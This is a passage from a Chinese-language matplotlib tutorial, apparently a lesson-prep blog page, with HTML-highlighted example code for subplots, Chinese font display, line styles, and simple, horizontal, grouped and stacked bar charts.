punctuation">(</span>nrows<span class="token punctuation">,</span>ncols<span class="token punctuation">,</span>plot_number<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><strong>实例5-8 : 一个figure对象画风两个子图实例</strong></p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> matplotlib<span class="token punctuation">.</span>pyplot <span class="token keyword">as</span> pltx <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">]</span>y <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token number">9</span><span class="token punctuation">,</span><span class="token number">12</span><span class="token punctuation">]</span>figure <span class="token operator">=</span> plt<span class="token punctuation">.</span>figure<span class="token punctuation">(</span><span class="token punctuation">)</span>axes1 <span class="token operator">=</span> figure<span class="token punctuation">.</span>add_subplot<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span>plt<span class="token punctuation">.</span>plot<span class="token punctuation">(</span>x<span class="token punctuation">,</span>y<span class="token punctuation">)</span>x <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">]</span>y <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">2.0</span><span class="token punctuation">,</span><span class="token number">3.5</span><span class="token punctuation">,</span><span class="token number">4.6</span><span class="token punctuation">]</span>axes2 <span class="token operator">=</span> figure<span class="token punctuation">.</span>add_subplot<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span>plt<span class="token punctuation">.</span>plot<span class="token punctuation">(</span>x<span class="token punctuation">,</span>y<span class="token punctuation">)</span>plt<span class="token punctuation">.</span>show<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>以格式一重写代码：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> matplotlib<span class="token punctuation">.</span>pyplot <span class="token keyword">as</span> pltx <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">]</span>y <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token number">9</span><span class="token punctuation">,</span><span class="token number">12</span><span class="token punctuation">]</span>figure <span class="token operator">=</span> plt<span class="token punctuation">.</span>figure<span class="token punctuation">(</span><span class="token punctuation">)</span>plt<span class="token punctuation">.</span>subplot<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span>plt<span class="token punctuation">.</span>plot<span class="token punctuation">(</span>x<span class="token punctuation">,</span>y<span class="token punctuation">)</span><span class="token comment">#补充一点课本上出现了两次的plt.show这可能是教材编写老师的失误，因为两编plt.show是得不到目标格式的</span>x <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">]</span>y <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">2.0</span><span class="token punctuation">,</span><span class="token number">3.5</span><span class="token punctuation">,</span><span class="token number">4.6</span><span class="token punctuation">]</span>plt<span class="token punctuation">.</span>subplot<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span>plt<span class="token punctuation">.</span>plot<span class="token punctuation">(</span>x<span class="token punctuation">,</span>y<span class="token punctuation">)</span>plt<span class="token punctuation">.</span>show<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="./python%E7%BB%98%E5%9B%BE%E5%8F%8A%E5%8F%AF%E8%A7%86%E5%8C%96%E5%A4%87%E8%AF%BE/Figure_8.png" alt=""></p><p><strong>例5-9：设置绘图的各种参数实例</strong></p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> matplotlib<span class="token punctuation">.</span>pyplot <span class="token keyword">as</span> plt<span class="token comment">#以下两句代码的作用是显示汉字图标题</span>plt<span class="token punctuation">.</span>rcParams<span class="token punctuation">[</span><span class="token string">'font.sans-serif'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'SimHei'</span><span class="token punctuation">]</span>plt<span class="token punctuation">.</span>rcParams<span class="token punctuation">[</span><span class="token string">'axes.unicode_minus'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token boolean">False</span><span class="token comment">#创建figure对象，划分子图</span>figure <span class="token operator">=</span> plt<span class="token punctuation">.</span>figure<span class="token punctuation">(</span><span class="token punctuation">)</span>axes1 <span class="token operator">=</span> figure<span class="token punctuation">.</span>add_subplot<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span>axes2 <span class="token operator">=</span> figure<span class="token punctuation">.</span>add_subplot<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token comment">#指定x,y列表值</span>x <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">]</span>y <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token number">9</span><span class="token punctuation">,</span><span class="token number">12</span><span class="token punctuation">]</span>axes1<span class="token punctuation">.</span>plot<span class="token punctuation">(</span>x<span class="token punctuation">,</span>y<span class="token punctuation">)</span><span class="token comment">#设置子图2的基本元素</span>axes2<span class="token punctuation">.</span>set_title<span class="token punctuation">(</span><span class="token string">'图标题'</span><span class="token punctuation">)</span>axes2<span class="token punctuation">.</span>set_xlabel<span class="token punctuation">(</span><span class="token string">'x轴标题'</span><span class="token punctuation">)</span>axes2<span class="token punctuation">.</span>set_ylabel<span class="token punctuation">(</span><span class="token string">'y轴标题'</span><span class="token punctuation">)</span><span class="token comment">#设置坐标轴范围</span>axes2<span class="token punctuation">.</span>set_xlim<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">)</span>axes2<span class="token punctuation">.</span>set_ylim<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token comment">#设置绘制的线型和颜色及标注内容</span>plot1<span class="token operator">=</span>axes2<span class="token punctuation">.</span>plot<span class="token punctuation">(</span>x<span class="token punctuation">,</span>y<span class="token punctuation">,</span>marker<span class="token operator">=</span><span class="token string">'o'</span><span class="token punctuation">,</span>color<span class="token operator">=</span><span class="token string">'r'</span><span class="token punctuation">,</span>label<span class="token operator">=</span><span class="token string">'点型红色'</span><span class="token punctuation">)</span>plot2<span class="token operator">=</span>axes2<span class="token punctuation">.</span>plot<span class="token punctuation">(</span>x<span class="token punctuation">,</span>y<span class="token punctuation">,</span>linestyle<span class="token operator">=</span><span class="token string">'--'</span><span class="token punctuation">,</span>color<span class="token operator">=</span><span class="token string">'b'</span><span class="token punctuation">,</span>label<span class="token operator">=</span><span class="token string">'线型蓝色'</span><span class="token punctuation">)</span>axes2<span class="token punctuation">.</span>legend<span class="token punctuation">(</span>loc<span class="token operator">=</span><span class="token string">'upper left'</span><span class="token punctuation">)</span> <span class="token comment">#在指定位置显示标注</span><span class="token comment">#显示网格绘制子图2</span>axes2<span class="token punctuation">.</span>grid<span class="token punctuation">(</span>b<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span>which<span class="token operator">=</span><span class="token string">'major'</span><span class="token punctuation">,</span>axis<span class="token operator">=</span><span class="token string">'both'</span><span class="token punctuation">,</span>alpha<span class="token operator">=</span> <span class="token number">0.5</span><span class="token punctuation">,</span>color<span class="token operator">=</span><span class="token string">'skyblue'</span><span class="token punctuation">,</span>linestyle<span class="token operator">=</span><span class="token string">'--'</span><span class="token punctuation">,</span>linewidth<span class="token operator">=</span><span class="token number">2</span><span class="token punctuation">)</span>axes2<span class="token punctuation">.</span>plot<span class="token punctuation">(</span>x<span class="token punctuation">,</span>y<span class="token punctuation">)</span>plt<span class="token punctuation">.</span>savefig<span class="token punctuation">(</span><span class="token string">'tu1.jpg'</span><span class="token punctuation">,</span>dpi<span class="token operator">=</span><span class="token number">300</span><span class="token punctuation">)</span> <span class="token comment">#保存图形</span>plt<span class="token punctuation">.</span>show<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="./python%E7%BB%98%E5%9B%BE%E5%8F%8A%E5%8F%AF%E8%A7%86%E5%8C%96%E5%A4%87%E8%AF%BE/Figure_9.png" alt=""></p><p>在python绘图中，不能直接显示汉字，但是我们经常希望绘制的图形中的标题及题注等能以汉字的形式显示，可以在代码中倒入库语句后面添加一下两句代码可以显示汉字<strong>plt.rcParams[‘font.sans-serif’]=[‘SimHei’]<strong>与</strong>plt.rcParams[‘axes.unicode_minus’]=False</strong>这两个一个是设置字符显示，一个是设置字体，<strong>SimHei</strong>这个实际上就是我们生活中常用到的<strong>黑体</strong></p><p><strong>例5-10:将一个figure对象划分为六个子图，分别绘制不同线型、不同颜色和标记的线条。</strong></p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> matplotlib<span class="token punctuation">.</span>pyplot <span class="token keyword">as</span> pltx <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">]</span>y <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token number">9</span><span class="token punctuation">,</span><span class="token number">12</span><span class="token punctuation">]</span>figure <span class="token operator">=</span> plt<span class="token punctuation">.</span>figure<span class="token punctuation">(</span><span class="token punctuation">)</span>axes1 <span class="token operator">=</span> figure<span class="token punctuation">.</span>add_subplot<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span>axes2 <span class="token operator">=</span> figure<span class="token punctuation">.</span>add_subplot<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span>axes3 <span class="token operator">=</span> figure<span class="token punctuation">.</span>add_subplot<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">)</span>axes4 <span class="token operator">=</span> figure<span class="token punctuation">.</span>add_subplot<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">)</span>axes5 <span class="token operator">=</span> figure<span class="token punctuation">.</span>add_subplot<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">)</span>axes6 <span class="token operator">=</span> figure<span class="token punctuation">.</span>add_subplot<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">)</span>axes1<span class="token punctuation">.</span>plot<span class="token punctuation">(</span>x<span class="token punctuation">,</span>y<span class="token punctuation">,</span> <span class="token string">'ro'</span><span class="token punctuation">)</span> <span class="token comment"># 红色圆点</span>axes2<span class="token punctuation">.</span>plot<span class="token punctuation">(</span>x<span class="token punctuation">,</span>y<span class="token punctuation">,</span> <span class="token string">'r-*'</span><span class="token punctuation">)</span> <span class="token comment">#红色星花直线</span>axes3<span class="token punctuation">.</span>plot<span class="token punctuation">(</span>x<span class="token punctuation">,</span>y<span class="token punctuation">,</span> <span class="token string">'bs'</span><span class="token punctuation">)</span> <span class="token comment">#蓝色方块</span><span class="token comment">#axes4.plot(x,y, 'g^-.') #绿色三角点划线</span>axes4<span class="token punctuation">.</span>plot<span class="token punctuation">(</span>x<span class="token punctuation">,</span>y<span class="token punctuation">,</span> <span class="token string">'^g-.'</span><span class="token punctuation">)</span>axes5<span class="token punctuation">.</span>plot<span class="token punctuation">(</span>x<span class="token punctuation">,</span>y<span class="token punctuation">,</span> <span class="token string">'m8'</span><span class="token punctuation">)</span>  <span class="token comment">#洋红八边形</span>axes6<span class="token punctuation">.</span>plot<span class="token punctuation">(</span>x<span class="token punctuation">,</span>y<span class="token punctuation">,</span> <span class="token string">'yd:'</span><span class="token punctuation">)</span> <span class="token comment">#黄色小菱形虚线</span>plt<span class="token punctuation">.</span>show<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在绘图时需要指定线条的线型，标记的符号及线条的颜色的参数值写进同一个大括号，而且对三个参数的前后顺序没有要求。</p><p><img src="./python%E7%BB%98%E5%9B%BE%E5%8F%8A%E5%8F%AF%E8%A7%86%E5%8C%96%E5%A4%87%E8%AF%BE/Figure_10.png" alt=""></p><h3 id="拓展三张图如何划分？">拓展三张图如何划分？</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> matplotlib<span class="token punctuation">.</span>pyplot <span class="token keyword">as</span> plt<span class="token keyword">import</span> numpy <span class="token keyword">as</span> np<span class="token keyword">def</span> <span class="token function">f</span><span class="token punctuation">(</span>t<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> np<span class="token punctuation">.</span>exp<span class="token punctuation">(</span><span class="token operator">-</span>t<span class="token punctuation">)</span> <span class="token operator">*</span> np<span class="token punctuation">.</span>sin<span class="token punctuation">(</span><span class="token number">2</span> <span class="token operator">*</span> np<span class="token punctuation">.</span>pi <span class="token operator">*</span> t<span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    t1 <span class="token operator">=</span> np<span class="token punctuation">.</span>arange<span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">0.1</span><span class="token punctuation">)</span>    t2 <span class="token operator">=</span> np<span class="token punctuation">.</span>arange<span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">0.2</span><span class="token punctuation">)</span>    plt<span class="token punctuation">.</span>figure<span class="token punctuation">(</span><span class="token punctuation">)</span>    plt<span class="token punctuation">.</span>subplot<span class="token punctuation">(</span><span class="token number">221</span><span class="token punctuation">)</span>    plt<span class="token punctuation">.</span>plot<span class="token punctuation">(</span>t1<span class="token punctuation">,</span> f<span class="token punctuation">(</span>t1<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">'bo'</span><span class="token punctuation">,</span> t2<span class="token punctuation">,</span> f<span class="token punctuation">(</span>t2<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">'g--'</span><span class="token punctuation">)</span>    plt<span class="token punctuation">.</span>subplot<span class="token punctuation">(</span><span class="token number">222</span><span class="token punctuation">)</span>    plt<span class="token punctuation">.</span>plot<span class="token punctuation">(</span>t2<span class="token punctuation">,</span> np<span class="token punctuation">.</span>cos<span class="token punctuation">(</span><span class="token number">2</span> <span class="token operator">*</span> np<span class="token punctuation">.</span>pi <span class="token operator">*</span> t2<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">'g--'</span><span class="token punctuation">)</span>    plt<span class="token punctuation">.</span>subplot<span class="token punctuation">(</span><span class="token number">212</span><span class="token punctuation">)</span>    plt<span class="token punctuation">.</span>plot<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">9</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    plt<span class="token punctuation">.</span>show<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="./python%E7%BB%98%E5%9B%BE%E5%8F%8A%E5%8F%AF%E8%A7%86%E5%8C%96%E5%A4%87%E8%AF%BE/Figure_11.png" alt=""></p><p>这种方式是通过<strong>plt.subplot</strong>再次划分整个图片的区域，虽然我们是将图片划分为了(2,2)总共四份的区域，但是由于前两张图只上半部分，我们可以将整个图看成两部分，即(2,1)结构划分，使第三张图片占据2号位置，就是实现了三张图片的划分</p><p>另一种方式<strong>subplot2grid()</strong></p><pre class="line-numbers language-python" data-language="python"><code class="language-python">subplot2grid<span class="token punctuation">(</span>shape<span class="token punctuation">,</span> loc<span class="token punctuation">,</span> rowspan<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">,</span> colspan<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">,</span> fig<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">,</span> <span class="token operator">**</span>kwargs<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><p><strong>shape :</strong> 组合图框架形状，以元组形式传递，如2行3列可以表示为（2,3）<br><strong>loc ：</strong> 指定子图所在位置，如第一个位置是（0，0）<br><strong>rowspan</strong> ：指定子图需要跨几行<br><strong>colspan</strong> ： 指定子图需要跨几列</p></blockquote><h2 id="5-4-条形图">5.4:  条形图</h2><p>条形图是数据分析中使用较多的数据可视化方式之一。在条形图中可以非常直观地通过位置比较数值大小。因为在条形图中条的高度就是数值，所以一眼就可以看出数值的高底。</p><p><strong>bar(x, height, width=0.8, bottom=None, …, align=‘center’)</strong></p><p>例5-11 :简单条形图</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> matplotlib<span class="token punctuation">.</span>pyplot <span class="token keyword">as</span> pltx <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">]</span>y <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token number">9</span><span class="token punctuation">,</span><span class="token number">12</span><span class="token punctuation">]</span>figure <span class="token operator">=</span> plt<span class="token punctuation">.</span>figure<span class="token punctuation">(</span><span class="token punctuation">)</span>plt<span class="token punctuation">.</span>bar<span class="token punctuation">(</span>x<span class="token punctuation">,</span> y<span class="token punctuation">)</span> <span class="token comment">#默认颜色，默认宽度为0.8</span>plt<span class="token punctuation">.</span>show<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="./python%E7%BB%98%E5%9B%BE%E5%8F%8A%E5%8F%AF%E8%A7%86%E5%8C%96%E5%A4%87%E8%AF%BE/Figure_12.png" alt=""></p><p>例5-12 : 横向条形图。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> matplotlib<span class="token punctuation">.</span>pyplot <span class="token keyword">as</span> pltx <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">]</span>y <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token number">9</span><span class="token punctuation">,</span><span class="token number">12</span><span class="token punctuation">]</span><span class="token comment"># x指定起始位置从0开始， bottom指定水平条起始位置为左侧， height指定绘制的水平条的宽度， width 指定绘制的水平条的长度。orientation指定要绘制的是水平条，color指定绘制的条形为红色。</span>plt<span class="token punctuation">.</span>bar<span class="token punctuation">(</span>x<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span> bottom<span class="token operator">=</span>y<span class="token punctuation">,</span> height<span class="token operator">=</span><span class="token number">0.5</span><span class="token punctuation">,</span> width<span class="token operator">=</span>x<span class="token punctuation">,</span> orientation<span class="token operator">=</span><span class="token string">"horizontal"</span><span class="token punctuation">,</span>color<span class="token operator">=</span><span class="token string">'r'</span><span class="token punctuation">)</span>plt<span class="token punctuation">.</span>show<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="./python%E7%BB%98%E5%9B%BE%E5%8F%8A%E5%8F%AF%E8%A7%86%E5%8C%96%E5%A4%87%E8%AF%BE/Figure_13.png" alt="">)</p><h3 id="5-4-2-多组条形图">5.4.2  多组条形图</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> numpy <span class="token keyword">as</span> np<span class="token keyword">import</span> matplotlib<span class="token punctuation">.</span>pyplot <span class="token keyword">as</span> pltx <span class="token operator">=</span> np<span class="token punctuation">.</span>arange<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span>y1<span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">12</span><span class="token punctuation">,</span> <span class="token number">33</span><span class="token punctuation">,</span> <span class="token number">53</span><span class="token punctuation">,</span> <span class="token number">66</span><span class="token punctuation">,</span><span class="token number">77</span><span class="token punctuation">]</span>y2 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">22</span><span class="token punctuation">,</span> <span class="token number">43</span><span class="token punctuation">,</span> <span class="token number">65</span><span class="token punctuation">,</span> <span class="token number">55</span><span class="token punctuation">,</span><span class="token number">68</span><span class="token punctuation">]</span>y3<span class="token operator">=</span><span class="token punctuation">[</span><span class="token number">23</span><span class="token punctuation">,</span><span class="token number">35</span><span class="token punctuation">,</span><span class="token number">46</span><span class="token punctuation">,</span><span class="token number">57</span><span class="token punctuation">,</span><span class="token number">67</span><span class="token punctuation">]</span>bar_width <span class="token operator">=</span> <span class="token number">0.3</span>plt<span class="token punctuation">.</span>bar<span class="token punctuation">(</span>x<span class="token punctuation">,</span> y1<span class="token punctuation">,</span> bar_width<span class="token punctuation">,</span>color<span class="token operator">=</span><span class="token string">'y'</span><span class="token punctuation">)</span>plt<span class="token punctuation">.</span>bar<span class="token punctuation">(</span>x<span class="token operator">+</span>bar_width<span class="token punctuation">,</span>y2<span class="token punctuation">,</span> bar_width<span class="token punctuation">,</span> align<span class="token operator">=</span><span class="token string">"center"</span><span class="token punctuation">,</span>color<span class="token operator">=</span><span class="token string">'r'</span><span class="token punctuation">)</span>plt<span class="token punctuation">.</span>bar<span class="token punctuation">(</span>x<span class="token operator">+</span>bar_width<span class="token operator">+</span>bar_width<span class="token punctuation">,</span>y3<span class="token punctuation">,</span> bar_width<span class="token punctuation">,</span> align<span class="token operator">=</span><span class="token string">"center"</span><span class="token punctuation">,</span>color<span class="token operator">=</span><span class="token string">'b'</span><span class="token punctuation">)</span>plt<span class="token punctuation">.</span>show<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="./python%E7%BB%98%E5%9B%BE%E5%8F%8A%E5%8F%AF%E8%A7%86%E5%8C%96%E5%A4%87%E8%AF%BE/Figure_14.png" alt=""></p><p>在绘制多组条形图进行对比的时候需要注意一点，bar_width的范围是(0,1)没错，但是多组图表需要保证几组图表的范围之和不超过1，以这个题为例，当bar_width设置为0.4三个表得到总和就超过了1，会导致重叠的发生。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> numpy <span class="token keyword">as</span> np<span class="token keyword">import</span> matplotlib<span class="token punctuation">.</span>pyplot <span class="token keyword">as</span> pltx <span class="token operator">=</span> np<span class="token punctuation">.</span>arange<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span>y1<span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">12</span><span class="token punctuation">,</span> <span class="token number">33</span><span class="token punctuation">,</span> <span class="token number">53</span><span class="token punctuation">,</span> <span class="token number">66</span><span class="token punctuation">,</span><span class="token number">77</span><span class="token punctuation">]</span>y2 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">22</span><span class="token punctuation">,</span> <span class="token number">43</span><span class="token punctuation">,</span> <span class="token number">65</span><span class="token punctuation">,</span> <span class="token number">55</span><span class="token punctuation">,</span><span class="token number">68</span><span class="token punctuation">]</span>bar_width <span class="token operator">=</span> <span class="token number">0.5</span>plt<span class="token punctuation">.</span>bar<span class="token punctuation">(</span>x<span class="token punctuation">,</span> y1<span class="token punctuation">,</span> bar_width<span class="token punctuation">,</span>color<span class="token operator">=</span><span class="token string">'b'</span><span class="token punctuation">)</span>plt<span class="token punctuation">.</span>bar<span class="token punctuation">(</span>x<span class="token punctuation">,</span> y2<span class="token punctuation">,</span> bar_width<span class="token punctuation">,</span> bottom<span class="token operator">=</span>y1<span class="token punctuation">,</span>color<span class="token operator">=</span><span class="token string">'r'</span><span class="token punctuation">)</span>plt<span class="token punctuation">.</span>show<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="./python%E7%BB%98%E5%9B%BE%E5%8F%8A%E5%8F%AF%E8%A7%86%E5%8C%96%E5%A4%87%E8%AF%BE/Figure_15.png" alt=""></p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> numpy <span class="token keyword">as</span> np<span class="token keyword">import</span> matplotlib<span class="token punctuation">.</span>pyplot <span class="token keyword">as</span> plt<span class="token comment">#字体设置为黑体</span>matplotlib<span class="token punctuation">.</span>rcParams<span class="token punctuation">[</span><span class="token string">'font.family'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'SimHei'</span>x <span class="token operator">=</span> np<span class="token punctuation">.</span>arange<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span>y1<span class="token operator">=</span><span class="token punctuation">[</span><span class="token number">90</span><span class="token punctuation">,</span> <span class="token number">88</span><span class="token punctuation">,</span> <span class="token number">78</span><span class="token punctuation">,</span> <span class="token number">99</span><span class="token punctuation">,</span> <span class="token number">87</span><span class="token punctuation">]</span>y2<span class="token operator">=</span><span class="token punctuation">[</span><span class="token number">98</span><span class="token punctuation">,</span> <span class="token number">77</span><span class="token punctuation">,</span> <span class="token number">86</span><span class="token punctuation">,</span> <span class="token number">85</span><span class="token punctuation">,</span> <span class="token 